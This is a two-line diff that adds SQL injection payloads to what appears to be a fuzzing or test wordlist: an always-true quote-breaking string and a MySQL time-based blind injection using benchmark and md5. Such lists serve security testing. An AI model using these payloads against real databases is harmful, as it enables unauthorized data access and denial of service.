@@ -1,0 +1,2 @@
+" or "x"="x
+'+benchmark(100000,md5(now()))+'
